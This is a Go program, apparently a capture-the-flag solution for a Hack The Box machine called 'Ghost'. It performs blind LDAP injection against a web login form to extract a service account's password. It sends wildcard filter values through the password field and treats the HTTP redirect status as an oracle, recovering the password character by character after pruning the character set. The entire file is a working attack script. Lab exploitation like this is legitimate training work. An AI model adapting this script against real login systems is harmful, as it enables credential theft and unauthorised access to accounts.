package main

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type LdapInjector struct {
	Url      string
	Username string
	Charset  string
}

func NewLdapInjector(url, username string) *LdapInjector {
	return &LdapInjector{
		Url:      url,
		Username: username,
		Charset:  CreateCharSet(),
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Next-Action", "c47eb076ccac91d6f828b671795550fd5925940") // hard coded for ghost box

	// golang auto follows redirects, disabling
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == http.StatusSeeOther, nil
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		if ok, err := li.TestPassword(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
			return "", err
		} else if ok {
			return string(c), nil
		}
	}
	return "", nil
}

func (li *LdapInjector) BruteForce() (string, error) {
	var result string
	for {
		c, err := li.TestCharacter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			if ok, err := li.TestPassword(result); err != nil {
				return "", err
			} else if ok {
				return "", fmt.Errorf("Partial password found: %s", result)
			}
			break
		}
		result += c
	}
	return result, nil
}

func CreateCharSet() string {
	var charset string

	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}

	for i := range 10 {
		c := strconv.Itoa(i)
		charset += c
	}
	return charset
}

func (li *LdapInjector) PruneCharset() error {
	var newCharset string
	for _, c := range li.Charset {
		if ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(c))); err != nil {
			return err
		} else if ok {
			newCharset += string(c)
		}
	}
	li.Charset = newCharset
	return nil
}

func main() {
	c := NewLdapInjector("http://intranet.ghost.htb:8008/login", "gitea_temp_principal")
	c.PruneCharset()

	pw, err := c.BruteForce()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Password found:", pw)
}
